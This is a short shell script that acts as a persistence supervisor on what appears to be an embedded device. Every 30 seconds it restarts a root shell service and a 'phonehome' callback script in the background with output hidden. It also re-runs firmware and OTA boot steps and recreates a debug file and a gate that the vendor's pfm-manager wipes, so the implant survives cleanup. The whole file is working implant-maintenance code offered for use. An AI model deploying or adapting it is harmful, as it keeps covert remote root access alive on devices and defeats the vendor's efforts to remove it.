#!/bin/sh
# Single supervisor. Every 30 s it makes sure the root shell service is up and
# the PFM gate still exists; pfm-manager wipes /var/local/pfmParse and
# /var/local/DebugPowerup after every run, so this is the repair loop that
# makes the lane self-healing.
. /var/local/alvidaa/alive.sh
L=/var/local/alvidaa/svc.lock
if mkdir "$L" 2>/dev/null; then
    echo $$ > "$L/pid"
else
    alive "$(cat "$L/pid" 2>/dev/null)" svc.sh && exit 0
    rm -rf "$L"; mkdir "$L" 2>/dev/null || exit 1; echo $$ > "$L/pid"
fi
trap 'rm -rf "$L"' EXIT INT TERM
D=/var/local/alvidaa
while true; do
    /bin/sh "$D/rshell.sh"    >/dev/null 2>&1 < /dev/null &
    /bin/sh "$D/phonehome.sh" >/dev/null 2>&1 < /dev/null &
    /bin/sh "$D/boot.sh" fw   >/dev/null 2>&1
    /bin/sh "$D/boot.sh" ota  >/dev/null 2>&1
    [ -f /var/local/pfmParse/PFMCheck ] || /bin/sh "$D/boot.sh" replant >/dev/null 2>&1
    [ -f /var/local/DebugPowerup ] || { touch /var/local/DebugPowerup; chmod 644 /var/local/DebugPowerup; }
    sleep 30
done
